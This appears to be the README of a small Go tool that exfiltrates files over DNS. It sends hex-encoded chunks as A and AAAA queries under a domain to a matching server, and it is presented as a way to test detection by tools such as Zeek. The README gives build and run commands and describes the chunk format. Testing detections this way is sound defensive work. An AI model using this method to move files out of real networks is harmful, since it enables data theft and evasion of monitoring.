# DNS Exfil Test Tool

This is a very basic file exfiltration tool that uses DNS A and AAAA records to exfiltrate files. This is a simple tool to easily test for detections for file exfiltration via DNS. The client sends the specified file as both A and AAAA requests, and currently the server responds just to A record requests with a bogus IP response. If Bro (Zeek) is being used, this tool should flag for anomalous dns traffic.

----------------------

To Use: **Server Side**
1. > cd dns-exfil-test/server 
2. > go mod init server/v2
3. > go get github.com/miekg/dns
4. > go build
5. > ./server

To Use: **Client Side**
1. > cd dns-exfil-test/client 
2. > sed -i -e 's|127.0.0.1|[SERVER_IP]|g' go-dnsclient.go
3. > go mod init dns-exfil-text/client
4. > go build
5. > ./client [file_to_send]


- the client will then read the contents of the file, hex encode it, and send it in 10 character chunks as A record requests. The format of each request is:
[10 hex encoded characters].macconsultants.com

- Once done the server will take all of the hex encoded data, combine, and unhexlify it to a file as ASCII in the same directory. The output file is called outfile.

- The server will not indicate when done but the client does. Once the client says it is done, you can kill the server and view the contents of outfile.

- You will need to rename the outfile if you want to send multiple files.

----------------------

***Example Execution:***

**Client**

![Image](client.png)

**Server**

![Image](server.png)


